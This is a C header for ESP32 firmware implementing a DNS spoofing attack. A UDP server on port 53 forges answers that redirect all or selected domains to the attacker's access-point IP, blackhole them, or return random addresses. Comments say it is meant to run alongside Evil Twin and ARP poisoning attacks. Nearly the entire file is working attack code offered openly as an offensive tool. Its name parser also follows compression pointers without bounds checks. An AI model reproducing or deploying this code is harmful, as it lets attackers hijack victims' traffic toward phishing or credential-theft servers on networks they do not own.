// dns_spoof.h - DNS Spoofing Attack (Redirect All Domains)
#ifndef DNS_SPOOF_H
#define DNS_SPOOF_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define DNS_PORT 53
#define DNS_MAX_PACKET 512

static const char *DNS_SPOOF_TAG = "DNS_Spoof";

typedef enum {
    SPOOF_MODE_ALL,        // Redirect everything to your IP
    SPOOF_MODE_BLACKHOLE,  // Return 0.0.0.0 (block all sites)
    SPOOF_MODE_SELECTIVE,  // Only spoof specific domains
    SPOOF_MODE_RANDOM      // Return random IPs (chaos mode)
} SpoofMode;

typedef struct {
    uint8_t running;
    SpoofMode mode;
    uint32_t spoof_ip;           // IP to return (0 = use AP IP)
    uint32_t packets_spoofed;
    TaskHandle_t task_handle;
    int socket_fd;
    
    // Selective mode
    char target_domains[10][64];
    uint8_t target_count;
} DnsSpoof;

static DnsSpoof dns_spoof = {0};

// DNS Header (12 bytes)
typedef struct __attribute__((packed)) {
    uint16_t id;
    uint16_t flags;
    uint16_t qd_count;
    uint16_t an_count;
    uint16_t ns_count;
    uint16_t ar_count;
} dns_header_t;

// DNS Question
typedef struct __attribute__((packed)) {
    uint16_t type;
    uint16_t class;
} dns_question_t;

// DNS Answer (for A record)
typedef struct __attribute__((packed)) {
    uint16_t name;      // Pointer to question name
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t data_len;
    uint32_t ip_addr;
} dns_answer_t;

// Parse domain name from DNS packet
static int parse_dns_name(const uint8_t *packet, int offset, char *name, int max_len) {
    int pos = offset;
    int name_pos = 0;
    int jumped = 0;
    int jump_pos = 0;
    
    while (packet[pos] != 0 && name_pos < max_len - 1) {
        // Check for pointer (compression)
        if ((packet[pos] & 0xC0) == 0xC0) {
            if (!jumped) {
                jump_pos = pos + 2;
            }
            pos = ((packet[pos] & 0x3F) << 8) | packet[pos + 1];
            jumped = 1;
            continue;
        }
        
        // Length byte
        int len = packet[pos++];
        if (len == 0) break;
        
        // Copy label
        if (name_pos > 0) {
            name[name_pos++] = '.';
        }
        
        for (int i = 0; i < len && name_pos < max_len - 1; i++) {
            name[name_pos++] = packet[pos++];
        }
    }
    
    name[name_pos] = '\0';
    return jumped ? jump_pos : pos + 1;
}

// Check if domain should be spoofed (selective mode)
static uint8_t should_spoof_domain(const char *domain) {
    if (dns_spoof.mode != SPOOF_MODE_SELECTIVE) {
        return 1; // Spoof everything in other modes
    }
    
    for (uint8_t i = 0; i < dns_spoof.target_count; i++) {
        if (strstr(domain, dns_spoof.target_domains[i]) != NULL) {
            return 1;
        }
    }
    
    return 0;
}

// Generate spoofed DNS response
static int generate_spoof_response(const uint8_t *query, int query_len, 
                                   uint8_t *response, const char *domain) {
    if (query_len > DNS_MAX_PACKET - sizeof(dns_answer_t)) {
        return 0;
    }
    
    // Copy query as base
    memcpy(response, query, query_len);
    
    dns_header_t *hdr = (dns_header_t *)response;
    
    // Set response flags
    hdr->flags = htons(0x8180); // Response, recursion available
    hdr->an_count = htons(1);   // 1 answer
    
    // Append answer section
    dns_answer_t *answer = (dns_answer_t *)(response + query_len);
    answer->name = htons(0xC00C);  // Pointer to question name
    answer->type = htons(1);       // A record
    answer->class = htons(1);      // IN
    answer->ttl = htonl(300);      // 5 minutes
    answer->data_len = htons(4);   // IPv4 = 4 bytes
    
    // Set spoofed IP based on mode
    uint32_t spoof_ip;
    
    switch (dns_spoof.mode) {
        case SPOOF_MODE_BLACKHOLE:
            spoof_ip = 0;  // 0.0.0.0
            break;
            
        case SPOOF_MODE_RANDOM:
            spoof_ip = esp_random();
            break;
            
        default:
            spoof_ip = dns_spoof.spoof_ip;
            break;
    }
    
    answer->ip_addr = spoof_ip;
    
    return query_len + sizeof(dns_answer_t);
}

// DNS spoofing task
static void dns_spoof_task(void *param) {
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    
    uint8_t rx_buffer[DNS_MAX_PACKET];
    uint8_t tx_buffer[DNS_MAX_PACKET];
    
    // Create UDP socket
    dns_spoof.socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_spoof.socket_fd < 0) {
        ESP_LOGE(DNS_SPOOF_TAG, "Failed to create socket");
        dns_spoof.running = 0;
        vTaskDelete(NULL);
        return;
    }
    
    // Bind to DNS port
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(DNS_PORT);
    
    if (bind(dns_spoof.socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        ESP_LOGE(DNS_SPOOF_TAG, "Failed to bind socket");
        close(dns_spoof.socket_fd);
        dns_spoof.running = 0;
        vTaskDelete(NULL);
        return;
    }
    
    ESP_LOGI(DNS_SPOOF_TAG, "DNS spoof server listening on port 53");
    ESP_LOGI(DNS_SPOOF_TAG, "Mode: %d, Target IP: %s", 
             dns_spoof.mode,
             dns_spoof.mode == SPOOF_MODE_BLACKHOLE ? "0.0.0.0" : "AP IP");
    
    while (dns_spoof.running) {
        // Receive DNS query
        int len = recvfrom(dns_spoof.socket_fd, rx_buffer, sizeof(rx_buffer), 0,
                          (struct sockaddr *)&client_addr, &client_len);
        
        if (len < sizeof(dns_header_t)) {
            continue;
        }
        
        dns_header_t *hdr = (dns_header_t *)rx_buffer;
        
        // Only handle queries
        if (ntohs(hdr->flags) & 0x8000) {
            continue;
        }
        
        // Parse domain name
        char domain[256];
        int name_end = parse_dns_name(rx_buffer, sizeof(dns_header_t), domain, sizeof(domain));
        
        if (name_end <= 0) {
            continue;
        }
        
        ESP_LOGI(DNS_SPOOF_TAG, "📧 Query: %s from %s", 
                 domain, inet_ntoa(client_addr.sin_addr));
        
        // Check if we should spoof this domain
        if (!should_spoof_domain(domain)) {
            ESP_LOGI(DNS_SPOOF_TAG, "   Ignoring (not in target list)");
            continue;
        }
        
        // Generate spoofed response
        int response_len = generate_spoof_response(rx_buffer, len, tx_buffer, domain);
        
        if (response_len > 0) {
            // Send spoofed response
            sendto(dns_spoof.socket_fd, tx_buffer, response_len, 0,
                   (struct sockaddr *)&client_addr, client_len);
            
            dns_spoof.packets_spoofed++;
            
            // Log the spoof
            dns_answer_t *ans = (dns_answer_t *)(tx_buffer + len);
            struct in_addr spoof_addr;
            spoof_addr.s_addr = ans->ip_addr;
            
            ESP_LOGI(DNS_SPOOF_TAG, "   🎯 SPOOFED → %s", inet_ntoa(spoof_addr));
        }
    }
    
    close(dns_spoof.socket_fd);
    ESP_LOGI(DNS_SPOOF_TAG, "DNS spoof stopped, total spoofs: %lu", dns_spoof.packets_spoofed);
    dns_spoof.task_handle = NULL;
    vTaskDelete(NULL);
}

// Start DNS spoofing
static inline uint8_t dns_spoof_start(SpoofMode mode) {
    if (dns_spoof.running) {
        ESP_LOGW(DNS_SPOOF_TAG, "Already running");
        return 0;
    }
    
    // Try to get IP address from AP interface first (Evil Twin mode)
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    
    // If no AP, try STA interface (ARP Poison mode)
    if (!netif) {
        netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    }
    
    if (!netif) {
        ESP_LOGE(DNS_SPOOF_TAG, "No network interface found!");
        ESP_LOGE(DNS_SPOOF_TAG, "Start Evil Twin OR connect to WiFi (for ARP Poison) first!");
        return 0;
    }
    
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(netif, &ip_info);
    
    dns_spoof.mode = mode;
    dns_spoof.spoof_ip = ip_info.ip.addr;
    dns_spoof.packets_spoofed = 0;
    dns_spoof.running = 1;
    
    // Start spoofing task
    BaseType_t result = xTaskCreate(dns_spoof_task, "dns_spoof", 4096, NULL, 5, &dns_spoof.task_handle);
    
    if (result != pdPASS) {
        dns_spoof.running = 0;
        ESP_LOGE(DNS_SPOOF_TAG, "Failed to create task");
        return 0;
    }
    
    char ip_str[16];
    sprintf(ip_str, "%d.%d.%d.%d",
            (int)((dns_spoof.spoof_ip >> 0) & 0xFF),
            (int)((dns_spoof.spoof_ip >> 8) & 0xFF),
            (int)((dns_spoof.spoof_ip >> 16) & 0xFF),
            (int)((dns_spoof.spoof_ip >> 24) & 0xFF));
    
    ESP_LOGI(DNS_SPOOF_TAG, "🚀 DNS Spoofing Started!");
    ESP_LOGI(DNS_SPOOF_TAG, "   Mode: %s", 
             mode == SPOOF_MODE_ALL ? "Redirect All" :
             mode == SPOOF_MODE_BLACKHOLE ? "Blackhole" :
             mode == SPOOF_MODE_SELECTIVE ? "Selective" : "Random Chaos");
    ESP_LOGI(DNS_SPOOF_TAG, "   Spoof IP: %s", ip_str);
    
    return 1;
}

// Stop DNS spoofing
static inline void dns_spoof_stop(void) {
    if (!dns_spoof.running) return;
    
    dns_spoof.running = 0;
    
    // Wait for task to finish
    uint8_t wait = 0;
    while (dns_spoof.task_handle && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(DNS_SPOOF_TAG, "Stopped - Total spoofs: %lu", dns_spoof.packets_spoofed);
}

// Add target domain for selective mode
static inline uint8_t dns_spoof_add_target(const char *domain) {
    if (dns_spoof.target_count >= 10) {
        ESP_LOGE(DNS_SPOOF_TAG, "Target list full");
        return 0;
    }
    
    strncpy(dns_spoof.target_domains[dns_spoof.target_count], domain, 63);
    dns_spoof.target_domains[dns_spoof.target_count][63] = '\0';
    dns_spoof.target_count++;
    
    ESP_LOGI(DNS_SPOOF_TAG, "Added target: %s", domain);
    return 1;
}

// Clear target list
static inline void dns_spoof_clear_targets(void) {
    dns_spoof.target_count = 0;
    memset(dns_spoof.target_domains, 0, sizeof(dns_spoof.target_domains));
}

// Get stats
static inline uint8_t dns_spoof_is_running(void) {
    return dns_spoof.running;
}

static inline uint32_t dns_spoof_get_count(void) {
    return dns_spoof.packets_spoofed;
}

static inline SpoofMode dns_spoof_get_mode(void) {
    return dns_spoof.mode;
}

static inline const char* dns_spoof_get_mode_name(SpoofMode mode) {
    switch (mode) {
        case SPOOF_MODE_ALL: return "Redirect All";
        case SPOOF_MODE_BLACKHOLE: return "Blackhole";
        case SPOOF_MODE_SELECTIVE: return "Selective";
        case SPOOF_MODE_RANDOM: return "Random Chaos";
        default: return "Unknown";
    }
}

#endif // DNS_SPOOF_H
